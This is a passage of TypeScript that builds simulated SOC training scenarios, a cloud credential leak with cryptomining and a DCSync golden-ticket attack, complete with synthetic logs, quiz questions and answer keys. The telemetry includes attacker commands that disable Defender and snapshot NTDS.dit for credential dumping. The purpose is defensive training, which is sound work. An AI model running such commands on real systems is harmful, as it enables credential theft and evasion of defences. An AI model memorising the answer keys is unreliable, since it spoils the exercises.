    { ts: T(2 * MIN),  phase: "Initial Access",            action: "Attacker bot GetCallerIdentity from Singapore — confirms stolen credentials valid within 2 minutes of commit" },
    { ts: T(4 * MIN),  phase: "Discovery",                 action: "Automated cloud recon: 12 S3 buckets, EC2 across 3 regions, 9 Secrets Manager entries — 90 seconds total" },
    { ts: T(6 * MIN),  phase: "Resource Hijacking",        action: "RunInstances us-east-1: 8x p3.8xlarge with XMRig UserData — $195.84/hr mining Monero" },
    { ts: T(8 * MIN),  phase: "Resource Hijacking",        action: "RunInstances eu-west-1: 6x p3.8xlarge — second region, combined 14 GPUs at $342.72/hr" },
    { ts: T(10 * MIN), phase: "Persistence",               action: "CreateUser: backdoor IAM account svc-lambda-monitoring created before original key revoked" },
    { ts: T(13 * MIN), phase: "Persistence",               action: "AttachUserPolicy: AdministratorAccess on backdoor account — full AWS takeover persists" },
    { ts: T(16 * MIN), phase: "Detection (GuardDuty)",     action: "GuardDuty CryptoCurrency:EC2/BitcoinTool.B!DNS — 14 instances, 847 DNS queries/min to pool.minexmr.com" },
    { ts: T(20 * MIN), phase: "Detection (Billing)",       action: "Cost Anomaly: $47,320 in 6 hours — 4,900% above $800/day baseline" },
    { ts: T(22 * MIN), phase: "Data Staging",              action: "PutBucketPolicy: rocketstack-prod-customer-data made public — via backdoor account" },
    { ts: T(24 * MIN), phase: "Exfiltration / Impact",    action: "4.7 GB (12,847 objects) downloaded via public HTTP — customer PII, payment tokens, API keys exfiltrated" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "The attacker struck within 2 minutes of the credentials being committed to GitHub. What does this tell you about the attack?",
      kind: "single",
      options: [
        { value: "A", label: "The attacker was manually watching GitHub for new commits from RocketStack" },
        { value: "B", label: "The attacker used an automated credential harvesting bot that scans GitHub in real-time" },
        { value: "C", label: "The credentials were leaked via a different channel before the GitHub commit" },
        { value: "D", label: "The developer a.levy@rocketstack.io was the actual attacker" },
      ],
      answer: "B",
      xp: 50,
      explanation: "The 2-minute window from commit to GetCallerIdentity is far too fast for a human attacker manually monitoring GitHub. Threat actors (particularly financially motivated groups like UNC3782) run automated bots that scan GitHub 24/7 for credential patterns using the GitHub API and regex matching. This is why GitHub secret scanning push protection must be enabled AND developers must be trained never to commit secrets. GitHub revoked the key after 3 minutes — but the 2-minute gap was already enough.",
    },
    {
      id: "q2",
      prompt: "evt_cm_07 shows AttachUserPolicy with AdministratorAccess attached to 'svc-lambda-monitoring'. Why is this the MOST critical event in the kill chain?",
      kind: "single",
      options: [
        { value: "A", label: "Because AdministratorAccess grants s3:GetObject, making this the call that directly enables the bucket download in the next event" },
        { value: "B", label: "Because it creates IAM persistence — the attacker retains full admin access even after the original stolen credentials are revoked" },
        { value: "C", label: "Because attaching AdministratorAccess silently stops CloudTrail from recording the principal's subsequent API calls, blinding the audit trail" },
        { value: "D", label: "Because admin rights let the attacker call ec2:RunInstances in every region, scaling the GPU mining fleet beyond the original quota" },
      ],
      answer: "B",
      xp: 75,
      explanation: "Revoking the leaked key (AKIA247316892041LEAK) is the obvious first containment step, and on its own it accomplishes nothing here. By T+13min the attacker has already created a second IAM user and attached AdministratorAccess to it, so their access no longer depends on the credential you are about to kill. The proof is in the telemetry rather than in the timing: evt_cm_10 (PutBucketPolicy) is performed by the BACKDOOR user, not by the leaked key. Containment has to enumerate what the stolen credential created before it is revoked — otherwise you close the door the attacker came through and leave the one they built.",
    },
    {
      id: "q3",
      prompt: "GuardDuty finding CryptoCurrency:EC2/BitcoinTool.B!DNS appears in evt_cm_08. What should an analyst do BEFORE terminating all 14 mining instances?",
      kind: "single",
      options: [
        { value: "A", label: "Immediately terminate all 14 instances from the EC2 console to stop the $342/hr spend, since ephemeral cloud compute leaves no forensic artifacts worth preserving" },
        { value: "B", label: "Capture a memory forensics snapshot from at least one running instance to preserve XMRig configuration, wallet addresses, and pool credentials before termination" },
        { value: "C", label: "Wait for the AWS Cost Anomaly Detection alert to corroborate the GuardDuty finding, since a single DNS-based finding is not enough to justify terminating capacity" },
        { value: "D", label: "Check the CMDB and tagging policy to confirm the p3.8xlarge instances are not an approved GPU training fleet, since terminating legitimate workloads is costly" },
      ],
      answer: "B",
      xp: 75,
      explanation: "While stopping the financial hemorrhage is urgent, forensic preservation is critical for the investigation. Running memory of a mining instance contains: the XMRig configuration file (wallet address, pool URL, pool password — which may link back to the threat actor), environment variables with any additional stolen credentials, and the full process tree. AWS SSM Run Command can execute a memory dump non-intrusively before the instance is terminated. Once instances are terminated, this evidence is gone forever.",
    },
    {
      id: "q4",
      prompt: "Which FOUR containment actions are required to fully remediate this incident? (Select all that apply)",
      kind: "multi",
      options: [
        { value: "A", label: "Revoke IAM user rocketstack-ci-deploy access keys (AKIA247316892041LEAK)" },
        { value: "B", label: "Delete the backdoor IAM user svc-lambda-monitoring and all its access keys" },
        { value: "C", label: "Terminate all GPU instances (p3.8xlarge) in us-east-1 and eu-west-1" },
        { value: "D", label: "Revert the rocketstack-prod-customer-data S3 bucket policy to private (Block Public Access)" },
        { value: "E", label: "Rotate the developer's GitHub personal access token and enable MFA on their account" },
        { value: "F", label: "Delete and recreate the CloudTrail trail to clear the polluted event history" },
      ],
      answer: ["A", "B", "C", "D"],
      xp: 100,
      explanation: "All four actions are mandatory and order matters: (A) must happen first to revoke the original stolen key — but alone is insufficient. (B) is equally critical: without deleting svc-lambda-monitoring, the attacker retains full AdministratorAccess even after (A). (C) stops the $342.72/hr cryptomining spend — but capture forensics first (see Q3). (D) stops ongoing public access to the breached S3 bucket and prevents additional data from being downloaded. (E) is wrong here: the leak was an AWS key committed to a repo, not a compromised GitHub account — rotating the PAT hardens the developer but removes none of the attacker's access. (F) is actively harmful: CloudTrail is your only record of what the attacker did, and deleting it destroys the evidence you need for scope and notification. Also required but not listed: rotate the 9 Secrets Manager secrets exposed during recon, and notify affected customers per breach-notification duty.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Cloud Credential Leak — Cryptomining + Data Breach",
    threat_actor: "Financially Motivated Actor (UNC3782)",
    attack_kind: "cloud_cryptomining",
    briefing: "GitHub Advanced Security reported an exposed AWS access key in rocketstack-io/deploy-scripts at 09:03. AWS Cost Anomaly Detection has since flagged a spend spike on the same account, and GuardDuty has an open finding. Scope the account.",
    narrative: `At 09:00, junior DevOps engineer a.levy accidentally committed AWS access keys to a public GitHub repository. GitHub's secret scanning detected the leak 3 minutes later and automatically revoked the key — but the damage was already done. Within 2 minutes of the commit, an automated bot operated by UNC3782 (a financially motivated threat actor known for scanning GitHub for cloud credentials) captured the keys and ran GetCallerIdentity to confirm they were valid. Over the next 24 minutes, the attacker executed a textbook cloud credential abuse playbook: rapid recon across S3, EC2, and Secrets Manager; launching 14 GPU instances (p3.8xlarge) across two regions to mine Monero at $342/hr; creating a backdoor IAM user with AdministratorAccess for persistence; and finally making a production S3 bucket public to exfiltrate 4.7GB of customer PII, payment tokens, and API keys. Your job: trace the attack from credential leak to data breach, identify the critical persistence mechanism that revoking the original key would not fix, and define the complete remediation sequence.`,
    learning_objectives: [
      "Understand how automated GitHub credential scanners work and why a 3-minute revocation window can still be too late",
      "Recognize the cloud attacker playbook: GetCallerIdentity → Discovery → RunInstances (cryptomining) → CreateUser (persistence) → Data exfiltration",
      "Identify why CreateUser + AttachUserPolicy (backdoor IAM) is the most critical persistence technique in cloud attacks",
      "Correlate GuardDuty CryptoCurrency findings with billing anomalies as dual detection signals for cryptomining",
      "Define the correct 4-step remediation order: revoke leaked key, delete backdoor account, terminate mining instances, restrict S3 access",
      "Understand why forensic memory capture of mining instances must happen BEFORE termination",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 11: DCSync → Golden Ticket (Domain Dominance)
// =========================================================================

export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): ScenarioBundle {
  const B = new Date("2026-06-03T22:15:00Z").getTime();   // 01:15 Israeli time (night attack)
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attackerIp   = "185.220.101.47";
  const dc01         = "SRV-NEXACORP-DC01";
  const dc02         = "SRV-NEXACORP-DC02";
  const adminEmail   = "it.admin@nexacorp.com";
  const mimikatzHash = makeSha256("mimikatz_win32_a_2026");
  const ntdsDitHash        = makeSha256("ntdsutil_ntds_snapshot");
  // ntdsutil.exe is a signed Microsoft binary; it cannot share a hash with
  // the 2.7 GB AD database extract it produces.
  const ntdsutilBinaryHash = makeSha256("ntdsutil_exe_system_binary");

  const events: TelemetryEvent[] = [
    // ── EVENT 1 — RDP logon from Netherlands attacker IP ────────────────────
    {
      id: "evt_dc_01_rdp", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc01, user_email: adminEmail, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1021.001",
      description: `The it.admin account logged on to ${dc01} with a RemoteInteractive (RDP) logon from ${attackerIp} in Amsterdam, Netherlands, at 01:15.`,
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097841",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": dc01 + "$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.TargetUserName": "ITAdmin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xC3F4A1",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "UNKNOWN",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51847",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "winlog.event_data.LogonGuid": "{B2C3D4E5-F6A1-B2C3-D4E5-F6A1B2C3D4E5}",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": T(0),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "source.geo.location.lat": 52.3702,
        "source.geo.location.lon": 4.8952,
        "host.name": dc01,
        "logon.type": "10",
        "logon.type_description": "RemoteInteractive (RDP)",
        "authentication.protocol": "Negotiate",
        "authentication.status": "success",
      },
    },

    // ── EVENT 2 — Mimikatz detected by Windows Defender ─────────────────────
    {
      id: "evt_dc_02_mimidetect", ts: T(3 * MIN),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.001",
      file: { path: "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe", sha256: mimikatzHash, size: 1245184 },
      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe on ${dc01} and took no action.`,
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "1116",
        "event.action": "av_detection",
        "event.created": T(3 * MIN),
        "windefend.threat.name": "HackTool:Win32/Mimikatz.A",
        "windefend.threat.id": "2147728490",
        "windefend.threat.category": "Hacktool",
        "windefend.threat.severity": "Severe",
        "windefend.action.name": "NotBlocked",
        "windefend.action.id": "9",
        "windefend.detection.source": "Real-Time Protection",
        "windefend.detection.source_id": "3",
        "windefend.detection.type": "Concrete",
        "windefend.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe",
        "windefend.process.name": "mimikatz.exe",
        "windefend.process.pid": "4872",
        "windefend.origin": "Local machine",
        "windefend.origin_id": "1",
        "windefend.signature.version": "1.411.74.0",
        "windefend.engine.version": "1.1.24050.5",
        "file.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe",
        "file.name": "mimikatz.exe",
        "file.hash.sha256": mimikatzHash,
        "file.size": "1245184",
        "file.signed": "false",
        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
        "host.ip": "10.0.1.10",
      },
    },

    // ── EVENT 3 — Windows Defender real-time protection disabled ─────────────
    {
      id: "evt_dc_03_av_disabled", ts: T(5 * MIN),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1562.001",
      description: `reg.exe set DisableRealtimeMonitoring=1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender on ${dc01}.`,
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "5001",
        "event.action": "real_time_protection_disabled",
        "event.created": T(5 * MIN),
        "windefend.threat.name": "Settings tampered",
        "windefend.threat.category": "PolicyViolation",
        "windefend.action.name": "NotBlocked",
        "windefend.detection.source": "Security Center",
        "windefend.path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        "windefend.process.name": "reg.exe",
        "windefend.process.pid": "5044",
        "registry.path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
        "registry.value": "1",
        "registry.data.type": "REG_DWORD",
        "registry.hive": "HKLM",
        "registry.change_type": "SetValue",
        "winlog.event_id": "5001",
        "winlog.channel": "Microsoft-Windows-Windows Defender/Operational",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Windows Defender",
        "winlog.event_data.Product Name": "Microsoft Defender Antivirus",
        "winlog.event_data.Product Version": "4.18.24050.7",
        "process.name": "reg.exe",
        "process.pid": "5044",
        "process.parent.name": "cmd.exe",
        "process.command_line": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
      },
    },

    // ── EVENT 4 — DCSync: DS-Replication-Get-Changes (Event 4662) ───────────
    {
      id: "evt_dc_04_dcsync_get", ts: T(8 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin, a user account, exercised DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights against CN=NEXACORP,DC=nexacorp,DC=com.",
      raw: {
        "winlog.event_id": "4662",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097904",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
        "winlog.event_data.ObjectClass": "domainDNS",
        "winlog.event_data.ObjectName": "CN=NEXACORP,DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.AdditionalInfo2": "-",
        "winlog.event_data.HandleId": "0x0",
        "event.code": "4662",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "event.created": T(8 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
      },
    },

    // ── EVENT 5 — DCSync: krbtgt hash extraction (second 4662) ─────────────
    {
      id: "evt_dc_05_dcsync_krbtgt", ts: T(10 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin issued a second replication request, this one specifically targeting CN=krbtgt,CN=Users,DC=nexacorp,DC=com.",
      raw: {
        "winlog.event_id": "4662",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097921",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{bf967aba-0de6-11d0-a285-00aa003049e2}",
        "winlog.event_data.ObjectClass": "user",
        "winlog.event_data.ObjectName": "CN=krbtgt,CN=Users,DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} {89e95b76-444d-4c62-991a-0facbeda640c}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.HandleId": "0x0",
        "event.code": "4662",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "event.created": T(10 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "ds.object.target": "krbtgt",
        "ds.object.sid": "S-1-5-21-2847391045-1923847562-3041928374-502",
      },
    },

    // ── EVENT 6 — the forged TGT is USED: a TGS request with no TGT behind it ─
    //
    // REWRITTEN. This event previously showed the golden ticket as a 4769 that
    // DC01 had ISSUED (Status 0x0, computer_name dc01), carrying
    // `TicketLifetime: 87600` and `PreAuthType: 0`. Three things were wrong, and
    // the third made the scenario teach the opposite of the truth:
    //
    //   1. `TicketLifetime` does not exist on ANY Windows Kerberos event.
    //      Ticket lifetime is visible in `klist` on the client, never in DC
    //      telemetry — and the graded question rested entirely on it.
    //   2. `PreAuthType` is a 4768 field, not a 4769 field.
    //   3. A golden ticket is forged OFFLINE from the krbtgt hash. The KDC never
    //      sees it minted and writes no issuance record at all. The scenario's
    //      own killchain said "forged offline" while its telemetry showed the DC
    //      issuing it.
    //
    // What a golden ticket ACTUALLY leaves behind is this: the attacker skips
    // the AS exchange entirely and presents the forged TGT to get service
    // tickets, so a 4769 appears with NO 4768 anywhere before it for that
    // account. That absence is the detection, and it is the reason golden
    // tickets are hard — there is nothing anomalous in the ticket itself.
    {
      id: "evt_dc_06_golden_kerberos", ts: T(13 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: dc02, user_email: adminEmail,
      severity: "high", mitre_technique: "T1558.001",
      description: `A service ticket for cifs/${dc02} was requested for it.admin from ${attackerIp}, encrypted with RC4 (0x17).`,
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": dc02,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097938",
        // TargetUserName is the requesting principal; ServiceName is the
        // service account backing the SPN that was asked for.
        "winlog.event_data.TargetUserName": "it.admin@NEXACORP",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": `${dc02.split(".")[0]}$`,
        "winlog.event_data.ServiceSid": "S-1-5-21-2847391045-1923847562-3041928374-1108",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51847",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "event.created": T(13 * MIN),
        "user.name": "it.admin@NEXACORP",
        "host.name": dc02,
        "source.ip": attackerIp,
      },
    },

    // ── EVENT 6b — the hunt that makes the ABSENCE observable ───────────────
    // You cannot see a missing log by staring at the feed, so the analyst has to
    // go and prove the negative. This is the SIEM query result that does it, and
    // it is deliberately a separate event: the student should understand that
    // this fact was *retrieved*, not handed over.
    {
      id: "evt_dc_06b_no_preceding_tgt", ts: T(14 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "threat_intel_match",
      hostname: dc01, user_email: adminEmail,
      severity: "high",
      description: "A hunting query for Kerberos 4768 events for it.admin across all domain controllers over the prior 24 hours returned zero rows.",
      raw: {
        "sentinel.query.name": "Kerberos TGS without preceding TGT",
        "sentinel.query.window_hours": "24",
        "sentinel.query.target_account": "it.admin@NEXACORP",
        "sentinel.query.event_id_searched": "4768",
        "sentinel.query.domain_controllers_covered": "DC-NEXACORP-01, DC-NEXACORP-02",
        "sentinel.query.rows_returned": "0",
        "sentinel.query.last_4768_for_account": "2026-05-28T09:14:22Z",
        "sentinel.domain.kerberos_encryption_policy": "AES256_HMAC_SHA1 (RC4 disabled 2024-03-11)",
      },
    },

    // ── EVENT 7 — Lateral movement to DC02 using Golden Ticket ──────────────
    {
      id: "evt_dc_07_lateral", ts: T(17 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc02, user_email: adminEmail, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1550.003",
      description: `it.admin authenticated to ${dc02} via a network logon (Type 3) directly from ${attackerIp}.`,
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": dc02,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1843201",
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.TargetUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.TargetUserName": "ITAdmin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xD4E5F6",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "Kerberos",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "52013",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": T(17 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "host.name": dc02,
        "logon.type": "3",
        "logon.type_description": "Network",
        "authentication.protocol": "Kerberos",
      },
    },

    // ── EVENT 8 — ntdsutil NTDS.dit snapshot (CrowdStrike EDR) ─────────────
    {
      id: "evt_dc_08_ntds", ts: T(20 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_copy",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.003",
      file: { path: "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit", sha256: ntdsDitHash, size: 2898534400 },
      process: {
        name: "ntdsutil.exe", pid: 6028, parent_name: "cmd.exe", parent_pid: 5044,
        cmdline: "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        // An interactive RDP session runs at High integrity even for a Domain
        // Admin — SYSTEM would need a service install or token theft, which this
        // chain never shows. ntdsutil only needs SeBackupPrivilege at High.
        user: "NEXACORP\\ITAdmin", integrity: "high",
      },
      description: `CrowdStrike detected ntdsutil.exe on ${dc01} creating a Volume Shadow Copy snapshot of NTDS.dit (2.7GB), written to C:\\Windows\\Temp\\ntds_snapshot_20260603.dit.`,
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:f7e8d9c0b1a2f7e8d9c0b1a2f7e8d9c0:9876543210",
        "crowdstrike.detection.description": "ntdsutil.exe executed with snapshot arguments to create a copy of the Active Directory database (NTDS.dit). This technique allows offline extraction of all domain credential hashes without directly touching the live NTDS.dit file (which is locked by LSASS).",
        "crowdstrike.detection.scenario": "ntds_dit_snapshot_via_ntdsutil",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "OS Credential Dumping: NTDS",
        "crowdstrike.detection.technique_id": "T1003.003",
        "crowdstrike.detection.pattern_id": "30758",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Gather Credentials",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.behaviors": "ntdsutil.exe snapshot operation on domain controller|NTDS.dit snapshot written to C:\\Windows\\Temp|ntdsutil running at high integrity|VSS snapshot created and mounted for AD database access",
        "crowdstrike.sensor.id": "f7e8d9c0b1a2f7e8d9c0b1a2f7e8d9c0",
        "crowdstrike.customer_id": "3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/f7e8d9c0b1a2f7e8d9c0b1a2f7e8d9c0/9876543210",
        "crowdstrike.commandline": "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.filename": "ntdsutil.exe",
        // The PROCESS image is ntdsutil.exe, a signed Microsoft binary. The .dit
        // it writes keeps ntdsDitHash on the file block.
        "crowdstrike.sha256": ntdsutilBinaryHash,
        "crowdstrike.username": "NEXACORP\\ITAdmin",
        "crowdstrike.privileges": ["SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege"],
        "crowdstrike.integrity_level": "12288",
        "event.code": "1",
        "event.action": "process_created",
        "event.created": T(20 * MIN),
        "process.name": "ntdsutil.exe",
        "process.pid": "6028",
        "process.executable": "C:\\Windows\\System32\\ntdsutil.exe",
        "process.command_line": "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        "process.hash.sha256": ntdsutilBinaryHash,
        "process.integrity_level": "HIGH_INTEGRITY_LEVEL",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5044",
        "file.path": "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit",
        "file.name": "ntds_snapshot_20260603.dit",
        "file.size": "2898534400",
        "file.created": T(20 * MIN + 45_000),
        "file.type": "Active Directory database snapshot",
        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
        "host.ip": "10.0.1.10",
      },
    },

    // ── EVENT 9 — Shadow admin account created ───────────────────────────────
    {
      id: "evt_dc_09_shadow_admin", ts: T(23 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "account_create",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1136.001",
      description: `it.admin created a new account, svc-monitoring-prod, on ${dc01} and immediately added it to Domain Admins.`,
      raw: {
        "winlog.event_id": "4720",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097985",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.TargetUserName": "svc-monitoring-prod",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": "S-1-5-21-2847391045-1923847562-3041928374-1337",
        "winlog.event_data.SamAccountName": "svc-monitoring-prod",
        "winlog.event_data.DisplayName": "Monitoring Service Account",
        "winlog.event_data.UserPrincipalName": "svc-monitoring-prod@nexacorp.com",
        "winlog.event_data.HomeDirectory": "-",
        "winlog.event_data.HomePath": "-",
        "winlog.event_data.ProfilePath": "-",
        "winlog.event_data.ScriptPath": "-",
        "winlog.event_data.AdminCount": "0",
        "winlog.event_data.AccountExpires": "%%Never",
        "winlog.event_data.PasswordLastSet": T(23 * MIN),
        "winlog.event_data.AccountControl": "0x200",
        "event.code": "4720",
        "event.action": "user-account-created",
        "event.outcome": "success",
        "event.created": T(23 * MIN),
        "correlated_event.winlog.event_id": "4728",
        "correlated_event.winlog.event_data.GroupName": "Domain Admins",
        "correlated_event.winlog.event_data.GroupDomainName": "NEXACORP",
        "correlated_event.winlog.event_data.GroupSid": "S-1-5-21-2847391045-1923847562-3041928374-512",
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "created_account.name": "svc-monitoring-prod",
        "created_account.upn": "svc-monitoring-prod@nexacorp.com",
        "created_account.group": "Domain Admins",
      },
    },

    // ── EVENT 10 — Security audit log cleared (Event 1102) ──────────────────
    {
      id: "evt_dc_10_logclear", ts: T(25 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1070.001",
      description: `it.admin cleared the Security event log on ${dc01} (Event 1102).`,
      raw: {
        "winlog.event_id": "1102",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Eventlog",
        "winlog.record_id": "2098001",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
